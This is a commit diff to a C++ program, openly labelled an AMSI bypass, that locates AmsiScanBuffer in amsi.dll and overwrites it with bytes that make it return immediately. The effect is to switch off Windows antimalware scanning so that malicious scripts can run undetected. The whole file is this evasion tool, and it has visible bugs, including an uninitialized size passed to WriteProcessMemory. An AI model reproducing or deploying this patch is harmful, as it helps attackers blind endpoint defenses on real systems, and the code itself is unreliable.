221f1fd991465e84482f97112facf3a6ddf2d371
ByteBrew <epicgamirr133769+alt4@gmail.com>
2025-01-17 21:19:09 -0800

    Weird exception was being thrown when I called LoadLibraryA

--- Patcher.cpp
+++ Patcher.cpp
@@ -5,11 +5,13 @@ int main(int argc, char** argv)
 {
 	SetConsoleTitleA("Amsi.Dll bypass");
 	std::cerr << "[+] Amsi bypass by GvhVisor + CodeForge.io" << std::endl;
-	HINSTANCE amsi = LoadLibraryA("amsi.dll");
+	HINSTANCE amsi = LoadLibraryEx(L"amsi.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES);
 	FARPROC amsiscanroutine = GetProcAddress(amsi, "AmsiScanBuffer");
 	CHAR patch[5] = { 0x31, 0xC0, 0xC3, 0x90, 0x90 };
 	DWORD old_protection;
 	VirtualProtect((LPVOID)amsiscanroutine, 5, PAGE_READWRITE, &old_protection);
 	SIZE_T bytes_written;
 	WriteProcessMemory(GetCurrentProcess(), (LPVOID)amsiscanroutine, patch, bytes_written, &bytes_written);
+	std::cerr << "[+] Patched, Amsi is now bypassed!" << std::endl;
+	std::cin.get();
 }
